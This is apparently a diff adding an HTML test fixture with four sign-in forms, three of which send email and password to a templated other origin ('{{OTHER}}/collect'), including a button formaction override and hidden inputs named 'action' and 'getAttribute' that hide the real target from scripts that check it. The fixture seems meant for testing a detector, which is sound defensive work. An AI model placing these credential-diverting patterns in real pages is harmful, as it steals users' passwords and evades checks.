@@ -1,0 +1,77 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Sign in — Elsewhere</title>
+    <style>
+      body { font: 16px system-ui, sans-serif; margin: 24px; }
+      .card { display: block; width: 360px; padding: 16px; border: 1px solid #ccc; margin-bottom: 24px; }
+      .row { display: block; margin: 10px 0; }
+    </style>
+  </head>
+  <body>
+    <main>
+      <h1>Three sign-in forms that send what you type somewhere else</h1>
+
+      <!-- 1. The form's action is another origin. -->
+      <form id="plain" class="card" action="{{OTHER}}/collect" method="post">
+        <h2>Form 1</h2>
+        <div class="row">
+          <label for="u1">Email</label>
+          <input id="u1" name="email" type="email" autocomplete="username" />
+        </div>
+        <div class="row">
+          <label for="p1">Password</label>
+          <input id="p1" name="password" type="password" autocomplete="current-password" />
+        </div>
+        <div class="row"><button type="submit">Sign in</button></div>
+      </form>
+
+      <!-- 2. The action stays here, but the button overrides it. -->
+      <form id="button" class="card" action="/session" method="post">
+        <h2>Form 2</h2>
+        <div class="row">
+          <label for="u2">Email</label>
+          <input id="u2" name="email" type="email" autocomplete="username" />
+        </div>
+        <div class="row">
+          <label for="p2">Password</label>
+          <input id="p2" name="password" type="password" autocomplete="current-password" />
+        </div>
+        <div class="row"><button type="submit" formaction="{{OTHER}}/collect">Sign in</button></div>
+      </form>
+
+      <!-- 3. The action is another origin, and a control named "action" (and one named "getAttribute") hides it from
+           any script that reads form.action or form.getAttribute the easy way. -->
+      <form id="shadowed" class="card" action="{{OTHER}}/collect" method="post">
+        <h2>Form 3</h2>
+        <input type="hidden" name="action" value="/session" />
+        <input type="hidden" name="getAttribute" value="x" />
+        <div class="row">
+          <label for="u3">Email</label>
+          <input id="u3" name="email" type="email" autocomplete="username" />
+        </div>
+        <div class="row">
+          <label for="p3">Password</label>
+          <input id="p3" name="password" type="password" autocomplete="current-password" />
+        </div>
+        <div class="row"><button type="submit">Sign in</button></div>
+      </form>
+
+      <!-- And one that stays home, to show the difference. -->
+      <form id="home" class="card" action="/session" method="post">
+        <h2>Form 4 (stays on this site)</h2>
+        <div class="row">
+          <label for="u4">Email</label>
+          <input id="u4" name="email" type="email" autocomplete="username" />
+        </div>
+        <div class="row">
+          <label for="p4">Password</label>
+          <input id="p4" name="password" type="password" autocomplete="current-password" />
+        </div>
+        <div class="row"><button type="submit">Sign in</button></div>
+      </form>
+    </main>
+    <script type="module" src="/harness.js"></script>
+  </body>
+</html>
